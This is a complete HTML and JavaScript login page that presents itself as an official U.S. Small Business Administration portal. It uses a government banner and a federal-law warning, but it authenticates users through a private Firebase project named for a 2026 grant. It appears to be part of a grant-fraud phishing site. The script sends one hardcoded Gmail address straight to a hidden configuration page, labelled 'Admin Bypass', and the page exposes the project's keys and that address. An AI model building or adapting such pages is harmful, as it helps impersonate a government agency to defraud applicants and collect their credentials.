
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SBA Portal | 2026 Login</title>
    <style>
        :root { --sba-blue: #00274c; --sba-accent: #1e3a8a; }
        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
        
        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
        .nav-header { background: var(--sba-blue); padding: 15px; text-align: center; }
        
        .container { max-width: 400px; margin: 30px auto; padding: 0 15px; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border-top: 5px solid var(--sba-blue); }
        
        label { display: block; font-size: 11px; font-weight: 900; color: var(--sba-blue); margin: 15px 0 6px; text-transform: uppercase; letter-spacing: 0.5px; }
        input { width: 100%; padding: 14px; border-radius: 8px; border: 1px solid #cbd5e1; font-size: 14px; outline: none; box-sizing: border-box; }
        
        /* Compact Button */
        .login-btn { 
            background: var(--sba-blue); 
            color: white; 
            padding: 16px; 
            border-radius: 8px; 
            width: 100%; 
            font-weight: 800; 
            border: none; 
            cursor: pointer; 
            text-transform: uppercase; 
            letter-spacing: 1px;
            margin-top: 10px;
        }
        .login-btn:disabled { background: #94a3b8; }

        .links { text-align: center; margin-top: 20px; font-size: 13px; color: #64748b; }
        .links a { color: var(--sba-accent); font-weight: 700; text-decoration: none; }
    </style>
</head>
<body>

    <div class="gov-banner">
        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE LOGIN
    </div>

    <div class="nav-header">
        <h1 style="margin:0; color: white; font-size: 18px; letter-spacing: 2px; font-weight: 900;">SBA.GOV</h1>
    </div>

    <div class="container">
        <div class="card">
            <div style="text-align: center; margin-bottom: 25px;">
                <h2 style="font-size: 22px; color: var(--sba-blue); margin: 0 0 5px;">System Login</h2>
                <p style="font-size: 12px; color: #64748b;">Enter credentials for portal access.</p>
            </div>
            
            <label>Email Address</label>
            <input type="email" id="email" placeholder="name@domain.com">

            <label>Password</label>
            <input type="password" id="password" placeholder="••••••••">

            <button id="loginBtn" class="login-btn">Login to Portal</button>
            
            <div class="links">
                New applicant? <a href="register.html">Create Account</a><br><br>
                <a href="forgot-password.html" style="font-weight: 500; color: #94a3b8;">Forgot password?</a>
            </div>
        </div>
        
        <div style="margin-top: 30px; border-top: 1px solid #cbd5e1; padding-top: 20px;">
            <p style="text-align: center; font-size: 10px; color: #94a3b8; line-height: 1.4;">
                <b>SECURE ACCESS WARNING:</b> Unauthorized access is strictly prohibited by Public Law 99-474. All activities are monitored and logged.
            </p>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, signInWithEmailAndPassword, reload } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
            authDomain: "sba-grant-2026.firebaseapp.com",
            projectId: "sba-grant-2026",
            storageBucket: "sba-grant-2026.firebasestorage.app",
            messagingSenderId: "838430821326",
            appId: "1:838430821326:web:6438deacb334076a64f99f"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const loginBtn = document.getElementById('loginBtn');

        loginBtn.onclick = async () => {
            const email = document.getElementById('email').value.trim();
            const pass = document.getElementById('password').value;

            if(!email || !pass) return alert("NOTICE: Identity credentials required.");

            loginBtn.innerText = "AUTHENTICATING...";
            loginBtn.disabled = true;

            try {
                const res = await signInWithEmailAndPassword(auth, email, pass);
                const user = res.user;

                // Admin Bypass
                if (email === "liger4683@gmail.com") {
                    window.location.href = 'system-config-v8.html';
                    return;
                }

                await reload(user);

                // Professional Routing
                if (user.emailVerified) {
                    window.location.href = 'welcome.html';
                } else {
                    window.location.href = 'verify.html';
                }

            } catch(err) {
                alert("ACCESS DENIED: Credentials do not match our records.");
                loginBtn.innerText = "Login to Portal";
                loginBtn.disabled = false;
            }
        };
    </script>
</body>
</html>
